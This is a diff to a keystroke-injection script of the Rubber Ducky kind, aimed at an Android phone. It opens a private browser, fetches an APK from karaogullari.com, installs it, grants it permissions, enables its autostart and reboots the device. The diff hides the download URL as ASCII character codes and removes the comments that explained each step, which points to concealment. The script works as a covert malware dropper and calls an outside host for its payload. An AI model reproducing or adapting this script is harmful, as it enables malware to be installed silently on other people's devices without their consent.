@@ -1,35 +1,37 @@
-REM Opens a private browser
 DELAY 200
 ESCAPE
 GUI d
 ALT ESCAPE
 GUI b
 DELAY 700
-REM PRIVATE_BROWSER is equal to CTRL + SHIFT + N
 CTRL SHIFT N
 DELAY 700
 CTRL l
 DELAY 300
-STRING karaogullari.com/bo.apk
+
+REM "karaogullari.com/bo.apk"
+ASCII 107 97 114 97 111 103 117 108 108 97 114 105 46 99 111 109 47 98 111 46 97 112 107
 DELAY 300
 ENTER
 DELAY 5000
-REM Click on the download button (assumes button is in the center of the screen)
-TOUCH 540 960
+
+TAB
+DELAY 300
+ENTER
 DELAY 10000
-REM Open the downloads folder
+
 GUI k
 DELAY 700
 STRING downloads
 DELAY 300
 ENTER
 DELAY 700
-REM Find the downloaded APK (assumes it's the most recent file)
+
 TAB
 DELAY 300
 ENTER
 DELAY 300
-REM Allow permissions (if required)
+
 TAB
 DELAY 300
 ENTER
@@ -38,15 +40,14 @@ TAB
 DELAY 300
 ENTER
 DELAY 300
-REM Install the APK
+
 TAB
 DELAY 300
 ENTER
 DELAY 10000
-REM Finish installation
+
 ENTER
-DELAY 500
-REM Open settings to enable auto-start
+
 GUI k
 DELAY 700
 STRING settings
@@ -57,7 +58,7 @@ STRING apps
 DELAY 300
 ENTER
 DELAY 1000
-STRING your_app_name  REM Replace with your actual app name
+STRING MainActivity
 DELAY 300
 ENTER
 DELAY 1000
@@ -65,8 +66,9 @@ STRING autostart
 DELAY 300
 ENTER
 DELAY 300
-TOGGLE 1  REM Toggle auto-start to enabled
+TOGGLE 1  
 DELAY 300
 HOME
 DELAY 500
-REBOOT  REM Reboot the device to test auto-start
+
+REBOOT
